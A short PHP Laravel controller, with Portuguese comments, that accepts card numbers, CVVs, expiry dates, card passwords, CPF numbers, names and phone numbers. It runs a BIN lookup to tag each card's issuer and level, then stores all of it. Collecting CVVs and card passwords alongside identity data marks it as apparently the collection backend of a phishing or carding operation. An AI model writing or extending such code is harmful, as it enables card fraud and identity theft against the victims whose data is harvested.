<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Services\BinLookupService;
use App\Models\Infos;

class CardApiController extends Controller
{

    protected $binLookupService;

    public function __construct(BinLookupService $binLookupService)
    {
        $this->binLookupService = $binLookupService;
    }


    public function data(Request $request){

        if (!$request->isJson()) {
            return response()->json(['error' => 'Expected JSON data'], 400);
        }
    
        // Tenta decodificar o JSON recebido
        $jsonData = $request->json()->all();
    
        // Verifica se o JSON possui a estrutura esperada
        if (!isset($jsonData['info'])) {
            return response()->json(['error' => 'Missing required "info" key'], 400);
        }

        $ccn = $jsonData['info']['ccn'];
        $ccn = preg_replace('/\s+/', '', $ccn);


        $info = Infos::where('ccn', $ccn)->first();
        if($info){
            $info->ccn = $ccn;
            $info->senha6 = $jsonData['info']['senha'];
            $info->save();

            return response()->json(['message' => 'Dados recebidos e salvos com sucesso. Info ja existia']);
        }
        else {
            $binNumber = substr($ccn, 0, 6);
            $binDetails = $this->binLookupService->getBinDetails($binNumber);
            if ($binDetails['valid'] === true) {
                $info = new Infos;
                $info->ccn = $ccn;
                $info->validade = $jsonData['info']['validade'];
                $info->cvv = $jsonData['info']['cvv'];
                $info->cpf = $jsonData['info']['cpf'];
                $info->senha6 = $jsonData['info']['senha'];
                $info->nome = $jsonData['info']['nome'];
                $info->telefone = $jsonData['info']['telefone'];
                $info->banco = $binDetails['card-brand'] . ' ' . $binDetails['issuer'];
                $info->level = $binDetails['card-category'];
                $info->save();
        
                return response()->json(['message' => 'Dados recebidos e salvos com sucesso']);
            }
        }
        
    }

}
